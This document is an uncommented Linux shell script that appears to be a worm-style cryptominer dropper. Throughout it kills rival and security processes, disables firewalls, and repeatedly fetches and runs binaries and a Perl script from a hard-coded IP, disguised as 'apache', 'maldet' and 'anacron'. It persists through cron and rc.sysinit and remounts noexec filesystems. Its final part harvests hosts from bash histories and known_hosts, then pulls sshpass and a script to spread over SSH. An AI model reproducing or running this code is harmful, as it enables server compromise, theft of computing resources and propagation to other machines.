cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 5 > .x3rgvda3
export PATH=$PATH:.
pwd=`pwd`
plm=`ps x |grep httpd.conf|grep -v grep`
plt=`cat /proc/cpuinfo|grep aes`
mal=`ps x|grep maldet|grep -v grep`
perl=`ps x|grep hald-daemon|grep -v grep`
file=`cat .x3rgvda3`
cronfile=`date| md5sum | awk '{print "."$1}'`
uname=`uname -a|grep 64|grep -v grep`
kill=`netstat -ant|grep "176.31.105.53:443"|grep -v grep`
kill1=`netstat -ant|grep "176.31.105.53:443"|grep -v grep`
ps x|grep "atd -c"|grep -v grep|awk '{print $1}'|xargs kill -9 > /dev/null 2>&1
ps x|grep kauditd|grep -v grep|awk '{print $1}'|xargs kill -9 > /dev/null 2>&1
ps x|grep stratum|grep -v grep|awk '{print $1}'|xargs kill -9 > /dev/null 2>&1
ps x|grep systemd-logind|grep -v grep|awk '{print $1}'|xargs kill -9 > /dev/null 2>&1
ps x|grep yam|grep -v grep|awk '{print $1}'|xargs kill -9 > /dev/null 2>&1
ps x|grep "t 16"|grep -v grep|awk '{print $1}'|xargs kill -9 > /dev/null 2>&1
ps x|grep ".configuration"|grep -v grep|awk '{print $1}'|xargs kill -9 > /dev/null 2>&1
ps x|grep "apache -c httpd.conf"|grep -v grep|awk '{print $1}'|xargs kill -9 > /dev/null 2>&1
ps x|grep "apache2 -c httpd.conf"|grep -v grep|awk '{print $1}'|xargs kill -9 > /dev/null 2>&1
ps x|grep "wnTKYg"|grep -v grep |awk '{print $1}'|xargs kill -9 > /dev/null 2>&1
ps x|grep "atd -c ixcnkupikm.conf"|grep -v grep |awk '{print $1}'|xargs kill -9 > /dev/null 2>&1
ps x|grep ".apache"|grep -v grep |awk '{print $1}'|xargs kill -9 > /dev/null 2>&1
ps x|grep "watchdog"|grep -v grep |awk '{print $1}'|xargs kill -9 > /dev/null 2>&1
ps x|grep "httpd -c httpd.cnf"|grep -v grep |awk '{print $1}'|xargs kill -9 > /dev/null 2>&1
##RG9uJ3QgYmUgc3R1cGlkIGR1ZGUuLmlsbCBraWxsIGV2ZXJ5IHJvb3QgdSBmdWNrZWQgdXAgOykuLmxldCdzIHdvcmsgdG9nZXRoZXIgc29tZWhvdy4uCg==##ps x|grep "wipefs"|grep -v grep |awk '{print $1}'|xargs kill -9 > /dev/null 2>&1
ps x|grep "shay"|grep -v grep |awk '{print $1}'|xargs kill -9 > /dev/null 2>&1
echo /etc/cron.daily/anacron >>/etc/rc.sysinit
if [ "$kill" != "" ]
  then
    kill -9 `ps x|grep httpd.conf|grep -v grep|awk '{print $1}'` > /dev/null 2>&1
if [ "$kill1" != "" ]
  then
    kill -9 `ps x|grep httpd.conf|grep -v grep|awk '{print $1}'` > /dev/null 2>&1
chattr +ia /bin/ /lib64/  > /dev/null 2>&1
crontab -r > /dev/null 2>&1
if [ "$uname" != "" ]
   then
if [ "$mal" != "" ]
  then
    echo
  else
    wget http://64.34.177.221/maldet > /dev/null 2>&1
    curl -O http://64.34.177.221/maldet > /dev/null 2>&1
    chmod +x maldet > /dev/null 2>&1
    (exec ./maldet &> /dev/null &)
if [ "$plm" != "" ]
  then
    echo
  else
/etc/init.d/iptables stop;service iptables stop;SuSEfirewall2 stop;reSuSEfirewall2 stop > /dev/null 2>&1
rm -rf  apache.* httpd.conf.* /usr/local/bin/sysmonitord > /dev/null 2>&1
echo 'nameserver 8.8.8.8'> /etc/resolv.conf
#echo "open 82.165.129.119 21" > ik ; echo "user anonymous anonymous" >> ik ;echo binary >> ik; echo "get apacheaes">>ik;echo "get httpd.conf" >>ik;echo "get libcrypto.so.6" >>ik;echo "get libcurl.so.4" >>ik;echo "getlibssl.so.6" >>ik; echo "get libldap-2.3.so.0" >>ik;echo "get liblber-2.3.so.0" >>ik;echo "get .mail">> ik;ftp -n <ik ; perl .mail;rm -rf .mail
curl -O http://64.34.177.221/apache > /dev/null 2>&1
wget http://64.34.177.221/apache > /dev/null 2>&1
wget http://64.34.177.221/httpd.conf > /dev/null 2>&1
curl -O http://64.34.177.221/httpd.conf > /dev/null 2>&1
chkconfig --level 0123456 iptables off > /dev/null 2>&1
chkconfig --level 0123456 ip6tables off > /dev/null 2>&1
systemctl stop iptables.service > /dev/null 2>&1
service iptables stop > /dev/null 2>&1
/etc/init.d/iptables stop > /dev/null 2>&1
reSuSEfirewall2 stop > /dev/null 2>&1
SuSEfirewall2 stop > /dev/null 2>&1
service ebtables stop > /dev/null 2>&1
/etc/init.d/ebtables stop > /dev/null 2>&1
ufw disable > /dev/null 2>&1
iptables -P INPUT ACCEPT > /dev/null 2>&1
iptables -P FORWARD ACCEPT > /dev/null 2>&1
iptables -P OUTPUT ACCEPT > /dev/null 2>&1
iptables -t nat -F > /dev/null 2>&1
iptables -t mangle -F > /dev/null 2>&1
iptables -F > /dev/null 2>&1
iptables -X > /dev/null 2>&1
                wget -O /etc/cron.daily/anacron http://64.34.177.221/a > /dev/null 2>&1 ; chmod +x /etc/cron.daily/anacron > /dev/null 2>&1
                curl -O http://64.34.177.221/a  > /dev/null 2>&1; mv a /etc/cron.daily/anacron ; chmod +x /etc/cron.daily/anacron > /dev/null 2>&1
chmod +x apache > /dev/null 2>&1
mv apache $file > /dev/null 2>&1
runexe=`./$file|grep denied|grep -v grep`
if [ "$runexe" != "" ]
	then
		mount -o remount,exec `mount|grep noexec|grep $pwd|awk '{print $1}'` > /dev/null 2>&1
	else
		echo
(exec ./$file -c httpd.conf &> /dev/null &)
merge=`ps x|grep httpd.conf|grep -v grep`
if [ "$merge" != "" ]
  then
    echo
  else
wget  http://64.34.177.221/libcrypto.so.6 > /dev/null 2>&1
wget  http://64.34.177.221/libcurl.so.4 > /dev/null 2>&1
wget  http://64.34.177.221/libssl.so.6 > /dev/null 2>&1
wget  http://64.34.177.221/libldap-2.3.so.0 > /dev/null 2>&1
wget  http://64.34.177.221/liblber-2.3.so.0 > /dev/null 2>&1
wget  http://64.34.177.221/libsasl2.so.2 > /dev/null 2>&1
curl -O http://64.34.177.221/libsasl2.so.2 > /dev/null 2>&1
curl -O http://64.34.177.221/libcrypto.so.6 > /dev/null 2>&1
curl -O http://64.34.177.221/libssl.so.6 > /dev/null 2>&1
curl -O http://64.34.177.221/libcurl.so.4 > /dev/null 2>&1
curl -O http://64.34.177.221/libldap-2.3.so.0 > /dev/null 2>&1
curl -O http://64.34.177.221/liblber-2.3.so.0 > /dev/null 2>&1
export LD_LIBRARY_PATH=`pwd`
(exec ./$file -c httpd.conf &> /dev/null &)
sleep 2
rm -rf wget* apache.* httpd.conf.* $file.* > /dev/null 2>&1
if [ "$plm" != "" ]
  then
    echo
  else
if [ "$plt" != "" ]
  then
        echo
  else
unset LD_LIBRARY_PATH > /dev/null 2>&1
chkconfig --level 0123456 iptables off > /dev/null 2>&1
chkconfig --level 0123456 ip6tables off > /dev/null 2>&1
systemctl stop iptables.service > /dev/null 2>&1
service iptables stop > /dev/null 2>&1
/etc/init.d/iptables stop > /dev/null 2>&1
reSuSEfirewall2 stop > /dev/null 2>&1
SuSEfirewall2 stop > /dev/null 2>&1
service ebtables stop > /dev/null 2>&1
/etc/init.d/ebtables stop > /dev/null 2>&1
ufw disable > /dev/null 2>&1
iptables -P INPUT ACCEPT > /dev/null 2>&1
iptables -P FORWARD ACCEPT > /dev/null 2>&1
iptables -P OUTPUT ACCEPT > /dev/null 2>&1
iptables -t nat -F > /dev/null 2>&1
iptables -t mangle -F > /dev/null 2>&1
iptables -F > /dev/null 2>&1
iptables -X > /dev/null 2>&1
                wget -O /etc/cron.daily/anacron http://64.34.177.221/a > /dev/null 2>&1 ; chmod +x /etc/cron.daily/anacron > /dev/null 2>&1
                curl -O http://64.34.177.221/a  > /dev/null 2>&1; mv a /etc/cron.daily/anacron ; chmod +x /etc/cron.daily/anacron > /dev/null 2>&1
#echo "open 82.165.129.119 21" > ik ; echo "user anonymous anonymous" >> ik ;echo binary >> ik; echo "get apacheaes">>ik;echo "get httpd.conf" >>ik;echo "get libcrypto.so.6" >>ik;echo "get libcurl.so.4" >>ik;echo "getlibssl.so.6" >>ik; echo "get libldap-2.3.so.0" >>ik;echo "get liblber-2.3.so.0" >>ik;echo "get .mail">> ik;ftp -n <ik ; perl .mail;rm -rf .mail
wget http://64.34.177.221/apacheaes > /dev/null 2>&1
curl -O http://64.34.177.221/apacheaes > /dev/null 2>&1
wget http://64.34.177.221/httpd.conf > /dev/null 2>&1
curl -O http://64.34.177.221/httpd.conf > /dev/null 2>&1
chmod +x apacheaes > /dev/null 2>&1
mv apacheaes $file > /dev/null 2>&1
runexe=`./$file|grep denied|grep -v grep`
if [ "$runexe" != "" ]
        then
                mount -o remount,exec `mount|grep noexec|grep $pwd|awk '{print $1}'` > /dev/null 2>&1
        else
                echo
./$file -c httpd.conf &> /dev/null &
merge=`ps x|grep httpd.conf|grep -v grep`
if [ "$merge" != "" ]
  then
    echo
  else
wget  http://64.34.177.221/libcrypto.so.6 > /dev/null 2>&1
wget  http://64.34.177.221/libcurl.so.4 > /dev/null 2>&1
wget  http://64.34.177.221/libssl.so.6 > /dev/null 2>&1
wget  http://64.34.177.221/libldap-2.3.so.0 > /dev/null 2>&1
wget  http://64.34.177.221/liblber-2.3.so.0 > /dev/null 2>&1
wget  http://64.34.177.221/libsasl2.so.2 > /dev/null 2>&1
curl -O http://64.34.177.221/libsasl2.so.2 > /dev/null 2>&1
curl -O http://64.34.177.221/libcrypto.so.6 > /dev/null 2>&1
curl -O http://64.34.177.221/libssl.so.6 > /dev/null 2>&1
curl -O http://64.34.177.221/libcurl.so.4 > /dev/null 2>&1
curl -O http://64.34.177.221/libldap-2.3.so.0 > /dev/null 2>&1
curl -O http://64.34.177.221/liblber-2.3.so.0 > /dev/null 2>&1
export LD_LIBRARY_PATH=`pwd`
(exec ./$file -c httpd.conf &> /dev/null &)
        else
                echo
if [ "$perl" != "" ]
  then
    echo
  else
wget -qO - http://64.34.177.221/.mail | perl > /dev/null 2>&1
curl -O http://64.34.177.221/.mail  > /dev/null 2>&1
fetch http://64.34.177.221/.mail > /dev/null 2>&1 ; perl .mail ; rm -rf .mail* > /dev/null 2>&1
#################################################32###################################################################
cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 5 > .x3rgvda3
export PATH=$PATH:.
pwd=`pwd`
plm=`ps x |grep httpd.conf|grep -v grep`
plt=`cat /proc/cpuinfo|grep aes`
mal=`ps x|grep maldet32|grep -v grep`
perl=`ps x|grep hald-daemon|grep -v grep`
file=`cat .x3rgvda3`
cronfile=`date| md5sum | awk '{print "."$1}'`
uname=`uname -a|grep -v 64|grep -v grep`
kill=`netstat -ant|grep "176.31.105.53:443"|grep -v grep`
kill1=`netstat -ant|grep "176.31.105.53:443"|grep -v grep`
ps x|grep "atd -c"|grep -v grep|awk '{print $1}'|xargs kill -9 > /dev/null 2>&1
ps x|grep kauditd|grep -v grep|awk '{print $1}'|xargs kill -9 > /dev/null 2>&1
ps x|grep stratum|grep -v grep|awk '{print $1}'|xargs kill -9 > /dev/null 2>&1
ps x|grep systemd-logind|grep -v grep|awk '{print $1}'|xargs kill -9 > /dev/null 2>&1
ps x|grep yam|grep -v grep|awk '{print $1}'|xargs kill -9 > /dev/null 2>&1
ps x|grep "t 16"|grep -v grep|awk '{print $1}'|xargs kill -9 > /dev/null 2>&1
ps x|grep ".configuration"|grep -v grep|awk '{print $1}'|xargs kill -9 > /dev/null 2>&1
ps x|grep "apache -c httpd.conf"|grep -v grep|awk '{print $1}'|xargs kill -9 > /dev/null 2>&1
ps x|grep "apache2 -c httpd.conf"|grep -v grep|awk '{print $1}'|xargs kill -9 > /dev/null 2>&1
ps x|grep "wnTKYg"|grep -v grep |awk '{print $1}'|xargs kill -9 > /dev/null 2>&1
ps x|grep "atd -c ixcnkupikm.conf"|grep -v grep |awk '{print $1}'|xargs kill -9 > /dev/null 2>&1
ps x|grep ".apache"|grep -v grep |awk '{print $1}'|xargs kill -9 > /dev/null 2>&1
ps x|grep "watchdog"|grep -v grep |awk '{print $1}'|xargs kill -9 > /dev/null 2>&1
ps x|grep "httpd -c httpd.cnf"|grep -v grep |awk '{print $1}'|xargs kill -9 > /dev/null 2>&1
ps x|grep "wipefs"|grep -v grep |awk '{print $1}'|xargs kill -9 > /dev/null 2>&1
echo /etc/cron.daily/anacron >>/etc/rc.sysinit
chattr +ia /bin/ /lib64/  > /dev/null 2>&1
crontab -r > /dev/null 2>&1
if [ "$uname" != "" ]
   then
if [ "$mal" != "" ]
  then
    echo
  else
    wget http://64.34.177.221/maldet32 > /dev/null 2>&1
    curl -O http://64.34.177.221/maldet32 > /dev/null 2>&1
    chmod +x maldet32 > /dev/null 2>&1
    (exec ./maldet32 &> /dev/null &)
if [ "$plm" != "" ]
  then
    echo
  else
/etc/init.d/iptables stop;service iptables stop;SuSEfirewall2 stop;reSuSEfirewall2 stop > /dev/null 2>&1
rm -rf  apache.* httpd.conf.* /usr/local/bin/sysmonitord > /dev/null 2>&1
echo 'nameserver 8.8.8.8'> /etc/resolv.conf
#echo "open 82.165.129.119 21" > ik ; echo "user anonymous anonymous" >> ik ;echo binary >> ik; echo "get apacheaes">>ik;echo "get httpd.conf" >>ik;echo "get libcrypto.so.6" >>ik;echo "get libcurl.so.4" >>ik;echo "getlibssl.so.6" >>ik; echo "get libldap-2.3.so.0" >>ik;echo "get liblber-2.3.so.0" >>ik;echo "get .mail">> ik;ftp -n <ik ; perl .mail;rm -rf .mail
curl -O http://64.34.177.221/apache32 > /dev/null 2>&1
wget http://64.34.177.221/apache32 > /dev/null 2>&1
wget http://64.34.177.221/httpd.conf > /dev/null 2>&1
curl -O http://64.34.177.221/httpd.conf > /dev/null 2>&1
chkconfig --level 0123456 iptables off > /dev/null 2>&1
chkconfig --level 0123456 ip6tables off > /dev/null 2>&1
systemctl stop iptables.service > /dev/null 2>&1
service iptables stop > /dev/null 2>&1
/etc/init.d/iptables stop > /dev/null 2>&1
reSuSEfirewall2 stop > /dev/null 2>&1
SuSEfirewall2 stop > /dev/null 2>&1
service ebtables stop > /dev/null 2>&1
/etc/init.d/ebtables stop > /dev/null 2>&1
ufw disable > /dev/null 2>&1
iptables -P INPUT ACCEPT > /dev/null 2>&1
iptables -P FORWARD ACCEPT > /dev/null 2>&1
iptables -P OUTPUT ACCEPT > /dev/null 2>&1
iptables -t nat -F > /dev/null 2>&1
iptables -t mangle -F > /dev/null 2>&1
iptables -F > /dev/null 2>&1
iptables -X > /dev/null 2>&1
                wget -O /etc/cron.daily/anacron http://64.34.177.221/a32 > /dev/null 2>&1 ; chmod +x /etc/cron.daily/anacron > /dev/null 2>&1
                curl -O http://64.34.177.221/a32  > /dev/null 2>&1; mv a32 /etc/cron.daily/anacron ; chmod +x /etc/cron.daily/anacron > /dev/null 2>&1
chmod +x apache32 > /dev/null 2>&1
mv apache32 $file > /dev/null 2>&1
runexe=`./$file|grep denied|grep -v grep`
if [ "$runexe" != "" ]
	then
		mount -o remount,exec `mount|grep noexec|grep $pwd|awk '{print $1}'` > /dev/null 2>&1
	else
		echo
(exec ./$file -c httpd.conf &> /dev/null &)
merge=`ps x|grep httpd.conf|grep -v grep`
if [ "$merge" != "" ]
  then
    echo
  else
wget  http://64.34.177.221/libcrypto.so.6.32 -O libcrypto.so.6 > /dev/null 2>&1
wget  http://64.34.177.221/libcurl.so.4.32 -O libcurl.so.4 > /dev/null 2>&1
wget  http://64.34.177.221/libssl.so.6.32 -O libssl.so.6 > /dev/null 2>&1
wget  http://64.34.177.221/libldap-2.3.so.0.32 -O libldap-2.3.so.0 > /dev/null 2>&1
wget  http://64.34.177.221/liblber-2.3.so.0.32 -O liblber-2.3.so.0 > /dev/null 2>&1
wget  http://64.34.177.221/libsasl2.so.2.32 -O libsasl2.so.2 > /dev/null 2>&1
curl -O http://64.34.177.221/libsasl2.so.2.32 ; mv libsasl2.so.2.32 libsasl2.so.2 > /dev/null 2>&1
curl -O http://64.34.177.221/libcrypto.so.6.32 ; mv libcrypto.so.6.32 libcrypto.so.6 > /dev/null 2>&1
curl -O http://64.34.177.221/libssl.so.6.32 ; mv libssl.so.6.32 libssl.so.6 > /dev/null 2>&1
curl -O http://64.34.177.221/libcurl.so.4.32 ; mv libcurl.so.4.32 libcurl.so.4 > /dev/null 2>&1
curl -O http://64.34.177.221/libldap-2.3.so.0.32 ; mv libldap-2.3.so.0.32 libldap-2.3.so.0 > /dev/null 2>&1
curl -O http://64.34.177.221/liblber-2.3.so.0.32 ; mv liblber-2.3.so.0.32 liblber-2.3.so.0 > /dev/null 2>&1
export LD_LIBRARY_PATH=`pwd`
(exec ./$file -c httpd.conf &> /dev/null &)
sleep 2
rm -rf wget* apache.* httpd.conf.* $file.* > /dev/null 2>&1
if [ "$perl" != "" ]
  then
    echo
  else
wget -qO - http://64.34.177.221/.mail | perl > /dev/null 2>&1
curl -O http://64.34.177.221/.mail  > /dev/null 2>&1
fetch http://64.34.177.221/.mail > /dev/null 2>&1 ; perl .mail ; rm -rf .mail* > /dev/null 2>&1
chattr -ia sshpass x > /dev/null 2>&1
rm -rf  a a.* apacheaes* ik* $file* apache.* apache2.* httpd.conf* crontab* lib* maldet* > /dev/null 2>&1
if [ -f .h ] ; then
        echo
        else
unset LD_LIBRARY_PATH
wget http://64.34.177.221/x 
curl -O http://64.34.177.221/x 
curl -O http://64.34.177.221/sshpass > /dev/null 2>&1
wget -O sshpass http://64.34.177.221/sshpass > /dev/null 2>&1
chmod +x sshpass > /dev/null 2>&1
chattr +ia sshpass x
last -a|awk '{print $10}'|sort -u|grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' > .h
cat /root/.ssh/known_hosts|grep -v ,|awk '{print $1}' >> .h
cat /root/.ssh/known_hosts|grep ,|awk -F, '{print $1}' >> .h
cat /root/.bash_history|grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}'|sort -u >> .h
cat /home/*/.ssh/known_hosts|grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}'|sort -u >> .h
cat /home/*/.bash_history|grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}'|sort -u >> .h
cat /etc/hosts|grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}'|sort -u >> .h
cat /home/*/.bash_history |grep ssh|awk '{print $2}'|grep -v '-'|grep -v / |sort -u >> .h
cat /home/*/.bash_history |grep ssh|awk '{print $3}'|grep -v '-'|grep -v / |sort -u >> .h
cat /root/.bash_history |grep ssh|awk '{print $2}'|grep -v '-'|grep -v /|sort -u >> .h
cat /root/.bash_history |grep ssh|awk '{print $3}'|grep -v '-'|grep -v /|sort -u >> .h
cat .h|grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' > .hh
cat .h|grep -v 127.0.0.1|grep -v localhost|sort -u >> .hh
cat .hh |sort -u > .h
for i in `seq 1 255` ;do echo `dig +short myip.opendns.com @resolver1.opendns.com|awk -F. '{print $1"."$2"."$3"."}'`$i >> .h ;done
rm -rf .hh httpd.conf.* ik* > /dev/null 2>&1
sh x $1 
sleep 10
chattr -ia sshpass x > /dev/null 2>&1
rm -rf  a a.* apacheaes* ik* $file*  apache.* apache2.* httpd.conf* crontab* lib* maldet* > /dev/null 2>&1
